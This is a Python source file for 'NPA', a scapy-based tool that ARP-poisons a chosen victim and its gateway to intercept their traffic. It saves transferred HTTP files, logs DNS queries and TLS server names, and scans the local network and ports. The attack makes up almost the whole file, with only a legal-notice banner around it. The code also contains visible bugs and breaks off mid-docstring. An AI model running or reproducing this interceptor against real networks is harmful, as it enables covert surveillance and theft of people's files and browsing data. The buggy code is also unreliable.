from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, srp,
                       IP, TCP, UDP, Raw, TCPSession, DNS, DNSQR, DNSRR,
                       ICMP, PcapWriter, arping)
from scapy.layers.tls.all import *
import os
import sys
import time
import ipaddress
import netifaces
import datetime
from datetime import timedelta
import base64
import subprocess
import signal
import shutil
from typing import Dict, Any, Optional
import concurrent.futures

# --- ToiletBanner Class ---

class ToiletBanner:
    """Class for creating ASCII art banners using toilet."""

    # Fonts available in the toilet
    FONTS = {
        'standard': 'standard',
        'big': 'bigmono12',
        'small': 'smblock',
        'mono': 'mono12',
        'future': 'future',
        'block': 'bigascii12',
        'banner': 'banner',
        'script': 'script',
        'digital': 'term',
        'smscript': 'smscript'
    }

    # Color filters and effects
    FILTERS = {
        'metal': 'metal',
        'rainbow': 'gay',
        'border': 'border',
        'none': None
    }

    # ANSI color codes
    COLORS = {
        'red': '\033[91m',
        'green': '\033[92m',
        'yellow': '\033[93m',
        'blue': '\033[94m',
        'magenta': '\033[95m',
        'cyan': '\033[96m',
        'white': '\033[97m',
        'reset': '\033[0m',
        'bold': '\033[1m',
        'dim': '\033[2m',
    }

    def __init__(self, auto_install_guide: bool = True):
        """Initializes the module and checks if toilet is installed."""
        self.toilet_available = self._check_toilet()
        if not self.toilet_available and auto_install_guide:
            self.print_install_guide()

    def _check_toilet(self) -> bool:
        """Check if the toilet tool is installed."""
        return shutil.which('toilet') is not None

    def create_banner(self, text: str, font: str = 'big',
                      filter_name: str = 'border', width: int = 80,
                      color: Optional[str] = None) -> str:

        """
        Creates an ASCII art banner using toilet.

        Args:
            text: Text for the banner
            font: Font name (see FONTS)
            filter_name: Filter/effect (see FILTERS)
            width: Maximum width of the banner
            color: Optional ANSI color for the output

        Returns:
            String containing the ASCII art banner
        """
        if not self.toilet_available:
            return self._fallback_banner(text, width, color)

        font_key = font if font in self.FONTS else 'big'
        filter_key = filter_name if filter_name in self.FILTERS else 'border'

        try:
            # Build toilet command
            cmd = ['toilet']

            # Add font
            if font_key in self.FONTS:
                cmd.extend(['-f', self.FONTS[font_key]])

            # Add filter
            if self.FILTERS[filter_key]:
                cmd.extend(['-F', self.FILTERS[filter_key]])
            cmd.extend(['-w', str(width)])
            cmd.append(text)

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                check=True
            )
            output = result.stdout

            if color and color in self.COLORS:
                output = f"{self.COLORS[color]}{output}{self.COLORS['reset']}"

            return output

        except subprocess.CalledProcessError:
            return self._fallback_banner(text, width, color)
        except Exception as e:
            sys.stderr.write(f"Error generating banner: {e}\n")
            return self._fallback_banner(text, width, color)

    def _fallback_banner(self, text: str, width: int = 80, color: Optional[str] = None) -> str:
        """Simple banner if toilet is not available."""
        if '\n' in text:
            lines = [line.strip() for line in text.split('\n')]
            text = ' | '.join(lines) # Joins with separator

        # Adjust width to center the text
        if len(text) > width - 4:
            text = text[:width - 7] + '...' # Truncate if too long

        text_len = len(text)
        border_len = width - 2
        
        # Recalculate border length based on actual width
        border = '═' * border_len

        # Calculate padding
        padding_len = width - 2 - text_len
        padding_left = padding_len // 2
        padding_right = padding_len - padding_left
        padding_text = ' ' * padding_left + text + ' ' * padding_right

        color_wrap = f"{self.COLORS.get(color, '')}" if color else ""
        reset = self.COLORS['reset'] if color else ""
        
        # Ensure lines are exactly 'width' long inside borders
        return f"{color_wrap}╔{border}╗\n║{padding_text[:border_len]}║\n╚{border}╝{reset}"

    def print_npa_banner(self, show_warning: bool = True):
        """Print the main npa banner."""
        # Always use create_banner for consistency
        banner_text = self.create_banner('N.P.A', font='big', filter_name='border', width=80)
        print(banner_text)

        # Additional information
        print(f"{self.COLORS['cyan']}{'─' * 80}{self.COLORS['reset']}")
        print(f"{self.COLORS['bold']}    NPA-Network Packet Analyzer & ARP Interceptor{self.COLORS['reset']}")
        print(f"{self.COLORS['dim']}    Version 0.20.0 - Network Traffic Analysis{self.COLORS['reset']}")
        print(f"{self.COLORS['cyan']}{'─' * 80}{self.COLORS['reset']}")

        if show_warning:
            print(f"\n{self.COLORS['yellow']}{self.COLORS['bold']}    LEGAL NOTICE:{self.COLORS['reset']}")
            print(f"{self.COLORS['yellow']}   • Use only on networks where you have explicit permission")
            print(f"{self.COLORS['yellow']}   • Unauthorized use is ILLEGAL and may result in penalties")
            print(f"{self.COLORS['yellow']}   • This tool is intended for authorized security testing")
            print(f"{self.COLORS['cyan']}{'─' * 80}{self.COLORS['reset']}\n")

    def _get_fallback_npa(self) -> str:
        """Banner fallback ASCII art for npa (legacy, now uses _fallback_banner)."""
        # For compatibility, but now uses create_banner
        return self._fallback_banner('NPA', width=80, color='cyan')

    def print_section_header(self, title: str, char: str = '─'):
        """Prints a stylized section header."""
        width = 80
        padding = (width - len(title) - 4) // 2

        print(f"\n{self.COLORS['cyan']}{char * width}{self.COLORS['reset']}")
        print(f"{self.COLORS['bold']}{' ' * padding}[ {title} ]{self.COLORS['reset']}")
        print(f"{self.COLORS['cyan']}{char * width}{self.COLORS['reset']}\n")

    def print_capture_start(self):
        """Prints the capture start banner."""
        banner_text = self.create_banner('CAPTURING', font='small', filter_name='none', width=60, color='green')
        print(banner_text)

    def print_analysis_complete(self):
            """Print complete analysis banner."""
            banner = self.create_banner('DONE', font='small', filter_name='none', width=40, color='green')
            print(banner)

    def print_error_banner(self, error_msg: str):
        """Print error banner"""
        print(f"\n{self.COLORS['red']}{'═' * 80}{self.COLORS['reset']}")
        print(f"{self.COLORS['red']}{' ' * 15} ERROR {self.COLORS['reset']}")
        print(f"{self.COLORS['red']}{'═' * 80}{self.COLORS['reset']}")
        print(f"\n  {self.COLORS['red']}{error_msg}{self.COLORS['reset']}")
        print(f"\n{self.COLORS['red']}{'═' * 80}{self.COLORS['reset']}\n")

    def print_stats_box(self, stats: Dict[str, Any]):
        """Prints a box with statistics."""
        width = 60
        print(f"\n{self.COLORS['cyan']}╔{'═' * (width - 2)}╗{self.COLORS['reset']}")
        print(f"{self.COLORS['cyan']}║{' ' * ((width - 20) // 2)} STATISTICS{' ' * ((width - 20) // 2)}║{self.COLORS['reset']}")
        print(f"{self.COLORS['cyan']}╠{'═' * (width - 2)}╣{self.COLORS['reset']}")

        for key, value in stats.items():
            val_str = str(value)
            content = f" {key}: {val_str} "
            content_len = len(content)
            if content_len > width - 2:
                content = content[:width - 5] + "..."
                padding_after = 0
            else:
                padding_after = (width - 2) - content_len
            line = f"{content}{' ' * padding_after}"
            print(f"{self.COLORS['cyan']}║{self.COLORS['reset']}{line}{self.COLORS['cyan']}║{self.COLORS['reset']}")

        print(f"{self.COLORS['cyan']}╚{'═' * (width - 2)}╝{self.COLORS['reset']}\n")

    def print_install_guide(self):
        """Print toilet installation guide."""
        print(f"\n{self.COLORS['yellow']}{'═' * 80}{self.COLORS['reset']}")
        print(f"   TOILET NOT INSTALLED - Using simplified banner")
        print(f"{self.COLORS['yellow']}{'═' * 80}{self.COLORS['reset']}")
        print(f"\n  For more attractive banners, install the toilet:")
        print(f"\n  {self.COLORS['cyan']}Ubuntu/Debian:{self.COLORS['reset']}")
        print(f"    sudo apt-get install toilet")
        print(f"\n  {self.COLORS['cyan']}Fedora/RHEL:{self.COLORS['reset']}")
        print(f"    sudo dnf install toilet")
        print(f"\n  {self.COLORS['cyan']}Arch Linux:{self.COLORS['reset']}")
        print(f"    sudo pacman -S toilet")
        print(f"\n  {self.COLORS['cyan']}macOS:{self.COLORS['reset']}")
        print(f"    brew install toilet")
        print(f"\n {self.COLORS['yellow']}{'═' * 80}{self.COLORS['reset']}\n")

# --- Utility Functions ---

# Initialize the banner tool globally
_banner_tool = ToiletBanner(auto_install_guide=True)

def validate_ip(ip):
    """Validates if the provided IP address is valid."""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def validate_interface(iface):
    """Checks if the network interface is valid."""
    return iface in netifaces.interfaces()


def get_mac(target_ip, iface):
    """Gets the MAC address for a given IP."""
    try:
        packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=target_ip)
        resp, _ = srp(packet, timeout=2, retry=3, verbose=False, iface=iface)
        for _, r in resp:
            return r[Ether].src
        return None
    except Exception as e:
        print(f"[ERROR] Could not get MAC for {target_ip}: {e}")
        return None

def check_port(ip: str, port: int, iface: str, timeout: float = 0.5) -> bool:
    """Check if a single port is open using SYN scan."""
    try:
        # Send SYN packet
        syn_pkt = IP(dst=ip) / TCP(dport=port, flags='S')
        resp = sr1(syn_pkt, timeout=timeout, verbose=0, iface=iface)

        if resp and TCP in resp and resp[TCP].flags & 0x12 == 0x12:     # SYN-ACK
            # Send RST to close the connection
            rst_pkt = IP(dst=ip) / TCP(dport=port, flags='R', seq=resp[TCP].ack, ack=resp[TCP].seq + 1)
            send(rst_pkt, verbose=0, iface=iface)
            return True
        return False
    except Exception:
        return False

def scan_ports(ip: str, ports: list, iface: str, timeout: float = 0.5, max_workers: int = 0.5) -> list:
    """Scan for open ports on a given IP using SYN scan."""
    open_ports = []
    print(f"[PORT SCAN] Scanning {ip} (parallel, timeout: {timeout}s)...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_port = {executor.submit(check_port, ip, port, iface, timeout): port for port in ports}
        for future in concurrent.futures.as_completed(future_to_port):
            port = future_to_port[future]
            try:
                if future.result():
                    open_ports.append(port)
                    print(f"  Port {port}: Open")
                else:
                    print(f"  Port {port}: Closed")
            except Exception as e:
                print(f"  Port {port}: Error - {e}")

    return open_ports

def scan_network(interface: str, output_dir: str = 'captures', port_scan: bool = False):
    """Scan the local network for active IPs and their MAC addresses."""
    _banner_tool.print_section_header("Network Scan", char="─")
    try:
        if netifaces.AF_INET not in netifaces.ifaddresses(interface):
            print(f"[ERROR] No IPv4 address configured on {interface}")
            return 
        
        ip_info = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]
        local_ip = ip_info['addr']
        netmask = ip_info['netmask']
        network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)

        print(f"[SCAN] Network: {network}")
        print(f"[SCAN] Local IP: {local_ip}")
        print(f"[SCAN] Scanning... (timeout: 3s)")

        ans, unans = arping(network, iface=interface, verbose=0, timeout=3)

        devices = []
        for sent, recv in ans:
            ip = recv[ARP].psrc
            mac = recv[Ether].src
            devices.append((ip, mac))

        # Sort by IPaddress
        devices.sort(key=lambda x: ipaddress.IPv4Address(x[0]))

        print(f"\n[RESULTS] Found {len(devices)} active devices:")
        _banner_tool.print_stats_box({"Total Devices": len(devices)})

        # Improved output: Table with IP, MAC, and ports if scanning
        headers = ["IP Address", "MAC Address"]
        if port_scan:
            headers.append("Open Ports")

        print("\n" + " | ".join(headers))
        print("-" * (15 + 3 + 17 + 3 + (20 if port_scan else 0)))

        # Common ports to scan
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5900, 8080]

        device_results = []
        for ip, mac in devices:
            open_ports = []
            if port_scan:
                open_ports = scan_ports(ip, common_ports, interface)

            port_str = ", ".join(map(str, open_ports)) if open_ports else "None"
            print(f"{ip:15} | {mac:17} | {port_str:20}" if port_scan else f"{ip:15} | {mac:17}")

            device_results.append(ip, mac, open_ports)

        # Save to log file
        os.makedirs(output_dir, exist_ok=True)
        timestamp = datetime.datetime.now().strdtime('%Y%m%d_%H%M%S')
        log_file = os.path.join(output_dir, f"network_scan_{timestamp}.log")
        with open(log_file, 'w') as f:
            f.write(f"Network Scan Result - {datetime.datetime.now()}\n")
            f.write(f"Network: {network}\n")
            f.write(f"Local IP: {local_ip}\n\n")
            if port_scan:
                f.write(f"Port Scan: Yes (Ports: {', '.join(map(str, common_ports))})\n")
            f.write("\n")
            f.write(" | ".join(headers) + "\n")
            f.write("-" * (15 + 3 + 17 + 3 + (20 if port_scan else 0)) + "\n")
            for ip, mac, open_ports in device_results:
                port_str = ", ".join(map(str, open_ports)) if open_ports else "None"
                line = f"{ip:15} | {mac:17} | {port_str:20}" if port_scan else f"{ip:15} | {mac:17}"
                f.write(line + "\n")

        print(f"\n[LOG] Results saved to: {log_file}")

        # Explanation
        print(f"\n{ _banner_tool.COLORS['cyan']}{'─' * 80}{_banner_tool.COLORS['reset']}")
        print(f"{_banner_tool.COLORS['bold']}HOW TO USE NETWORK SCAN{_banner_tool.COLORS['reset']}")
        print(f"{_banner_tool.COLORS['cyan']}{'─' * 80}{_banner_tool.COLORS['reset']}")
        print(f"• Run: sudo python3 npa.py -i {interface} --scan-network")
        print(f"• Add --port-scan for port detection on common ports.")
        print(f"• Results include IPs, MACs, and open ports (if scanned).")
        print(f"• Logs saved in {output_dir} for further analysis.")
        print(f"• Use discovered IPs as --victim in live capture mode.")
        print(f"{_banner_tool.COLORS['cyan']}{'─' * 80}{_banner_tool.COLORS['reset']}\n")

    except Exception as e:
        _banner_tool.print_error_banner(f"Network scan failed: {e}")

def print_banner():
    """Displays the program banner using ToiletBanner."""
    # This method prints the NPA banner, version, and legal notice
    _banner_tool.print_npa_banner(show_warning=True)


class NetworkAnalyzer:
    """Main class for network traffic analysis and capture."""

    def __init__(self, victim, gateway, interface='eth0', output_dir='captures',
                 cleanup_age_hours=24, tcpdump_filter=None, pcap_input=None):
        """
        Initializes the network analyzer.

        Args:
            victim: IP of the victim (target)
            gateway: IP of the gateway
            interface: Network interface
            output_dir: Output directory
            cleanup_age_hours: Age of logs for automatic cleanup
            tcpdump_filter: Custom filter for tcpdump
            pcap_input: PCAP file for offline analysis
        """
        self.victim = victim
        self.gateway = gateway
        self.interface = interface
        self.output_dir = output_dir
        self.cleanup_age_hours = cleanup_age_hours
        self.tcpdump_filter = tcpdump_filter
        self.pcap_input = pcap_input
        self.poison_thread = None
        self.sniff_thread = None

        conf.iface = interface
        conf.verb = 0

        # Validations
        if not self.pcap_input:
            if not validate_ip(victim) or not validate_ip(gateway):
                raise ValueError("Invalid IP address provided.")
            if not validate_interface(interface):
                raise ValueError(f"Interface {interface} not found.")

            print("[INFO] Getting MAC addresses...")
            self.victimmac = get_mac(victim, interface)
            self.gatewaymac = get_mac(gateway, interface)

            if not self.victimmac or not self.gatewaymac:
                raise ValueError("Could not get MAC addresses.")
        else:
            self.victimmac = None
            self.gatewaymac = None

        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)
        print(f"[OK] Output directory: {os.path.abspath(self.output_dir)}")

        # Supported MIME types
        self.mime_set = {
            'image/jpeg', 'image/jpg', 'image/png', 'image/bmp', 'image/webp',
            'video/mp4', 'video/avi', 'text/plain', 'application/pdf',
            'application/msword', 'application/json',
            'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
        }

        # Extension mapping
        self.ext_map = {
            'image/jpeg': '.jpg', 'image/jpg': '.jpg', 'image/png': '.png',
            'image/bmp': '.bmp', 'image/webp': '.webp', 'video/mp4': '.mp4',
            'video/avi': '.avi', 'text/plain': '.txt', 'application/pdf': '.pdf',
            'application/msword': '.doc', 'application/json': '.json',
            'application/vnd.openxmlformats-officedocument.wordprocessingml.document': '.docx'
        }

        # Dictionaries for tracking TLS flows
        self.flows_sni = {}
        self.flows_cert = {}
        self.pcap_filename = None

        if not self.pcap_input:
            print(f"\n[CONFIG] Interface: {interface}")
            print(f"[CONFIG] Gateway: {gateway} ({self.gatewaymac})")
            print(f"[CONFIG] Target: {victim} ({self.victimmac})")
            print("═" * 60)

    def cleanup_logs(self):
        """Automatically cleans up old log files."""
        now = datetime.datetime.now()
        cleanup_count = 0

        print(f"\n[INFO] Starting log cleanup for files older than {self.cleanup_age_hours}h...")

        for filename in os.listdir(self.output_dir):
            if filename.endswith('.log'):
                filepath = os.path.join(self.output_dir, filename)
                if os.path.isfile(filepath):
                    mtime = datetime.datetime.fromtimestamp(os.path.getmtime(filepath))
                    if now - mtime > timedelta(hours=self.cleanup_age_hours):
                        try:
                            os.remove(filepath)
                            cleanup_count += 1
                            print(f"  ✓ Removed: {filename}")
                        except Exception as e:
                            print(f"  ✗ Error removing {filename}: {e}")

        if cleanup_count > 0:
            print(f"[OK] Cleanup complete: {cleanup_count} file(s) removed")
        else:
            print("[INFO] No old files to remove")

    def analyze_with_tcpdump(self):
        """Analyzes the captured PCAP using tcpdump."""
        if not self.pcap_filename or not os.path.exists(self.pcap_filename):
            print("[WARNING] No PCAP file available for analysis.")
            return

        try:
            cmd = ['tcpdump', '-r', self.pcap_filename, '-nn', '-v']

            if self.tcpdump_filter:
                cmd.extend(self.tcpdump_filter.split())
            else:
                cmd.extend(['-c', '50'])

            _banner_tool.print_section_header("Tcpdump Analysis", char="═")
            print(f"Analyzing: {os.path.basename(self.pcap_filename)}")

            result = subprocess.run(cmd, capture_output=True, text=True, check=True)
            print(result.stdout)

            if result.stderr:
                print(f"[WARNING] {result.stderr}")

            print("═" * 60)

        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Error executing tcpdump: {e}")
            print("[HINT] Install tcpdump: sudo apt install tcpdump")
        except FileNotFoundError:
            print("[ERROR] Tcpdump not found. Install with: sudo apt install tcpdump")

    def run(self, enable_tcpdump=False):
        """Starts the capture and analysis processes."""
        # Configure signal handler
        signal.signal(signal.SIGINT, self._signal_handler)

        if self.pcap_input:
            # Offline mode
            print(f"[MODE] Offline Analysis - Processing: {self.pcap_input}\n")
            self.sniff(offline_file=self.pcap_input)
            self.cleanup_logs()

            if enable_tcpdump:
                self.analyze_with_tcpdump()
            return

        # Live capture mode
        print("[MODE] Live Capture\n")

        try:
            self.poison_thread = Process(target=self.poison)
            self.poison_thread.start()

            self.sniff_thread = Process(target=self.sniff)
            self.sniff_thread.start()

            # Wait for processes
            self.poison_thread.join()
            self.sniff_thread.join()

        except KeyboardInterrupt:
            print("\n\n[INFO] User interruption detected...")
            self._cleanup_and_exit(enable_tcpdump)
        except Exception as e:
            print(f"\n[ERROR] Error during execution: {e}")
            self._cleanup_and_exit(enable_tcpdump)

    def _signal_handler(self, signum, frame):
        """Handler for interruption signals."""
        print("\n\n[INFO] Interruption signal received...")
        self._cleanup_and_exit(False)
        sys.exit(0)

    def _cleanup_and_exit(self, enable_tcpdump):
        """Performs cleanup and terminates processes."""
        self.restore()
        self.terminate_processes()
        self.cleanup_logs()

        if enable_tcpdump:
            self.analyze_with_tcpdump()

    def poison(self):
        """Performs ARP poisoning to intercept traffic."""
        poison_victim = ARP(
            op=2,
            psrc=self.gateway,
            pdst=self.victim,
            hwdst=self.victimmac
        )

        poison_gateway = ARP(
            op=2,
            psrc=self.victim,
            pdst=self.gateway,
            hwdst=self.gatewaymac
        )

        print("[ARP] Poisoning configuration:")
        print(f"  → Victim: {poison_victim.summary()}")
        print(f"  → Gateway: {poison_gateway.summary()}")
        print("\n[ARP] Starting poisoning... [CTRL+C to stop]")

        while True:
            try:
                send(poison_victim, verbose=False)
                send(poison_gateway, verbose=False)
                sys.stdout.write('.')
                sys.stdout.flush()
                time.sleep(2)
            except KeyboardInterrupt:
                self.restore()
                sys.exit(0)

    def extract_sni(self, payload):
        """Extracts SNI (Server Name Indication) from TLS Client Hello."""
        if len(payload) < 5 or not payload.startswith(b'\x16\x03'):
            return None

        try:
            tls = TLS(payload)
            if (tls.type == 22 and hasattr(tls, 'msg') and tls.msg and
                len(tls.msg) > 0 and tls.msg[0].type == 1):

                for ext in tls.msg[0].ext:
                    if isinstance(ext, TLS_Ext_ServerName) and hasattr(ext, 'servernames'):
                        for sn in ext.servernames:
                            if hasattr(sn, 'servername'):
                                return sn.servername.decode('utf-8', errors='ignore')
        except:
            pass

        return None

    def extract_cert(self, payload):
        """Extracts TLS server certificate."""
        if len(payload) < 5 or not payload.startswith(b'\x16\x03'):
            return None

        try:
            tls = TLS(payload)
            if tls.type == 22 and hasattr(tls, 'msg'):
                for msg in tls.msg:
                    if msg.type == 11:  # Certificate
                        if hasattr(msg, 'certs') and msg.certs and len(msg.certs) > 0:
                            cert_bytes = msg.certs[0][1]
                            b64_cert = base64.b64encode(cert_bytes).decode('ascii')

                            # Format into 64-character lines
                            lines = [b64_cert[i:i+64] for i in range(0, len(b64_cert), 64)]
                            pem = "-----BEGIN CERTIFICATE-----\n"
                            pem += "\n".join(lines)
                            pem += "\n-----END CERTIFICATE-----"

                            return pem
        except:
            pass

        return None

    def analyze_cert(self, filename):
        """Analyzes TLS certificate using openssl."""
        try:
            result = subprocess.run(
                ['openssl', 'x509', '-in', filename, '-text', '-noout'],
                capture_output=True,
                text=True,
                check=True
            )

            print(f"\n{'─' * 60}")
            print(f"TLS Certificate Analysis: {os.path.basename(filename)}")
            print("─" * 60)
            print(result.stdout)
            print("─" * 60)

        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Error analyzing certificate {filename}: {e}")
        except FileNotFoundError:
            print("[ERROR] OpenSSL not found. Install with: sudo apt install openssl")

    def handle_dns(self, packet):
        """Processes DNS packets (queries and responses)."""
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

        if packet[DNS].qr == 0:  # Query
            qname = packet[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
            qtype = packet[DNS].qd.qtype

            print(f"[DNS Query] {timestamp} - {qname} (Type: {qtype})")

            log_file = os.path.join(self.output_dir, f"dns_queries_{datetime.datetime.now().strftime('%Y%m%d')}.log")
            with open(log_file, 'a') as f:
                f.write(f"{timestamp} | Query: {qname} | Type: {qtype}\n")

        elif packet[DNS].qr == 1:  # Response
            if packet[DNS].ancount > 0:
                for i in range(packet[DNS].ancount):
                    rr = packet[DNS].an[i]
                    if isinstance(rr, DNSRR):
                        rrname = rr.rrname.decode('utf-8', errors='ignore').rstrip('.')
                        rdata = str(rr.rdata)

                        print(f"[DNS Response] {timestamp} - {rrname} → {rdata} (Type: {rr.type})")

                        log_file = os.path.join(self.output_dir, f"dns_responses_{datetime.datetime.now().strftime('%Y%m%d')}.log")
                        with open(log_file, 'a') as f:
                            f.write(f"{timestamp} | Response: {rrname} → {rdata} | Type: {rr.type}\n")

    def handle_icmp(self, packet):
        """Processes ICMP packets."""
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        icmp_type = packet[ICMP].type
        icmp_code = packet[ICMP].code
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst

        if icmp_type == 8 and icmp_code == 0:  # Echo Request
            print(f"[ICMP Echo Request] {timestamp} - {src_ip} → {dst_ip}")
            log_file = os.path.join(self.output_dir, f"icmp_requests_{datetime.datetime.now().strftime('%Y%m%d')}.log")

        elif icmp_type == 0 and icmp_code == 0:  # Echo Reply
            print(f"[ICMP Echo Reply] {timestamp} - {src_ip} → {dst_ip}")
            log_file = os.path.join(self.output_dir, f"icmp_replies_{datetime.datetime.now().strftime('%Y%m%d')}.log")

        else:
            print(f"[ICMP] {timestamp} - Type:{icmp_type} Code:{icmp_code} - {src_ip} → {dst_ip}")
            log_file = os.path.join(self.output_dir, f"icmp_other_{datetime.datetime.now().strftime('%Y%m%d')}.log")

        with open(log_file, 'a') as f:
            f.write(f"{timestamp} | Type:{icmp_type} Code:{icmp_code} | {src_ip} → {dst_ip}\n")

    def sniff(self, offline_file=None):
        """Captures network packets or processes offline PCAP file."""

        if offline_file:
            print(f"[INFO] Processing offline PCAP: {offline_file}\n")
            self.pcap_filename = offline_file
            writer = None
            bpf_filter = None

        else:
            time.sleep(5)
            _banner_tool.print_capture_start()

            self.pcap_filename = os.path.join(
                self.output_dir,
                f"capture_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
            )

            print(f"[PCAP] Saving to: {self.pcap_filename}")
            print("[INFO] Wireshark compatible\n")

            bpf_filter = (f"((tcp port 80 or tcp port 443) or (udp port 53 or tcp port 53) "
                         f"or icmp) and host {self.victim}")

            writer = PcapWriter(self.pcap_filename, append=False)

        def handle_packet(packet):
            """Processes each captured packet."""

            if IP not in packet:
                if writer:
                    writer.write(packet)
                return

            # Determine if the packet is relevant to the target, excluding loopback traffic
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst

            # Process ICMP
            if ICMP in packet:
                self.handle_icmp(packet)
                if writer:
                    writer.write(packet)
                return

            # Process DNS (UDP or TCP)
            if (UDP in packet or TCP in packet) and (packet.sport == 53 or packet.dport == 53):
                if DNS in packet:
                    self.handle_dns(packet)
                if writer:
                    writer.write(packet)
                return

            # Process TCP with payload
            if TCP not in packet or Raw not in packet:
                if writer:
                    writer.write(packet)
                return

            payload = bytes(packet[Raw])

            if len(payload) == 0:
                if writer:
                    writer.write(packet)
                return

            sport = packet[TCP].sport
            dport = packet[TCP].dport
            flow_key = (src_ip, dst_ip, sport, dport)
            rev_flow_key = (dst_ip, src_ip, dport, sport)
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

            # Process HTTP (port 80)
            if dport == 80 or sport == 80:
                self._handle_http(packet, payload, timestamp, writer)

            # Process HTTPS (port 443)
            elif dport == 443 or sport == 443:
                self._handle_https(packet, payload, flow_key, rev_flow_key, timestamp, writer)

            else:
                if writer:
                    writer.write(packet)

        try:
            if offline_file:
                sniff(offline=offline_file, prn=handle_packet, store=False, session=TCPSession)
            else:
                sniff(iface=self.interface, filter=bpf_filter, prn=handle_packet,
                     store=False, session=TCPSession)

        except Exception as e:
            _banner_tool.print_error_banner(f"Error during capture: {e}")

        finally:
            if writer:
                writer.close()
                print(f"\n[OK] PCAP saved: {self.pcap_filename}")

            if not offline_file:
                self.restore()
                self.terminate_processes()

    def _handle_http(self, packet, payload, timestamp, writer):
        """Processes HTTP packets."""

        if b"Content-Type:" not in payload:
            if writer:
                writer.write(packet)
            return

        try:
            header_end = payload.find(b"\r\n\r\n")

            if header_end == -1:
                if writer:
                    writer.write(packet)
                return

            headers_raw = payload[:header_end]
            body = payload[header_end + 4:]

            if len(body) == 0:
                if writer:
                    writer.write(packet)
                return

            headers = headers_raw.decode('latin1', errors='ignore')
            content_type = None

            for line in headers.splitlines():
                if line.lower().startswith("content-type:"):
                    ct_value = line.split(":", 1)[1].strip().lower()
                    mime = ct_value.split(';')[0].strip()

                    if mime in self.mime_set:
                        content_type = mime
                        break

            if content_type:
                ext = self.ext_map.get(content_type, '.bin')
                safe_mime = content_type.replace('/', '_')
                filename = os.path.join(
                    self.output_dir,
                    f"http_{timestamp}_{safe_mime}{ext}"
                )

                with open(filename, 'wb') as f:
                    f.write(body)

                print(f"[HTTP] Saved: {os.path.basename(filename)} ({len(body)} bytes, {content_type})")

            else:
                if writer:
                    writer.write(packet)

        except Exception as e:
            print(f"[ERROR] Error processing HTTP: {e}")
            if writer:
                writer.write(packet)

    def _handle_https(self, packet, payload, flow_key, rev_flow_key, timestamp, writer):
        """Processes HTTPS/TLS packets."""

        # Extract SNI
        sni = self.extract_sni(payload)

        if sni:
            if flow_key not in self.flows_sni and rev_flow_key not in self.flows_sni:
                self.flows_sni[flow_key] = sni
                print(f"[TLS SNI] {sni} (flow: {flow_key[0]}:{flow_key[2]} → {flow_key[1]}:{flow_key[3]})")
            elif rev_flow_key in self.flows_sni:
                self.flows_sni[flow_key] = self.flows_sni[rev_flow_key]

        # Extract certificate
        cert_pem = self.extract_cert(payload)

        if cert_pem:
            cert_key = flow_key if flow_key in self.flows_sni else rev_flow_key

            if cert_key not in self.flows_cert:
                sni_str = self.flows_sni.get(cert_key, 'unknown')
                safe_sni = sni_str.replace('.', '_').replace(':', '_')
                filename = os.path.join(
                    self.output_dir,
                    f"tls_cert_{timestamp}_{safe_sni}.pem"
                )

                with open(filename, 'w') as f:
                    f.write(cert_pem)

                self.flows_cert[cert_key] = filename
                print(f"[TLS CERT] Saved: {os.path.basename(filename)} (SNI: {sni_str})")

                # Analyze certificate
                self.analyze_cert(filename)

        # Save encrypted payload
        sni_str = self.flows_sni.get(flow_key, self.flows_sni.get(rev_flow_key, 'unknown'))
        safe_sni = sni_str.replace('.', '_').replace(':', '_')
        filename = os.path.join(
            self.output_dir,
            f"https_{timestamp}_{safe_sni}.bin"
        )

        with open(filename, 'wb') as f:
            f.write(payload)

        print(f"[HTTPS] Saved: {os.path.basename(filename)} ({len(payload)} bytes, SNI: {sni_str})")

        if writer:
            writer.write(packet)

    def restore(self):
        """Restores ARP tables to the original state."""

        if not self.victimmac or not self.gatewaymac:
            return

        print("\n[ARP] Restoring ARP tables...")

        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst=self.victimmac
        ), count=5, verbose=False)

        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst=self.gatewaymac
        ), count=5, verbose=False)

        print("[OK] ARP tables restored")

    def terminate_processes(self):
        """Safely terminates processes."""

        for proc in [self.poison_thread, self.sniff_thread]:
            if proc and proc.is_alive():
                proc.terminate()
                proc.join(timeout=2.0)

                if proc.is_alive():
                    proc.kill()

# --- Main Function ---
# Entry point of the script. Handles argument parsing, mode selection (live/offline/scan), and execution.

def main():
    """Main function."""

    import argparse

    print_banner()


    # Check for root privileges (only for live mode)
    if len(sys.argv) > 1 and '--pcap-input' not in ' '.join(sys.argv):
        if os.getuid() != 0:
            print("[ERROR] This program requires root privileges for live capture.")
            print("[HINT] Run with: sudo python3 npa.py [options]")
            print("[INFO] For offline analysis, use --pcap-input without sudo")
            sys.exit(1)

    # Argument parser
    parser = argparse.ArgumentParser(
        description="Network Traffic Analyzer with support for ARP poisoning and offline analysis.",
        epilog="""
USAGE EXAMPLES:

  Live capture (requires root):
    sudo python3 npa.py -v 192.168.1.100 -g 192.168.1.1 -i eth0

  With automatic tcpdump analysis:
    sudo python3 npa.py -v 192.168.1.100 -g 192.168.1.1 -i wlan0 --tcpdump

  Custom tcpdump filter:
    sudo python3 npa.py -v 192.168.1.100 -g 192.168.1.1 -i eth0 \\
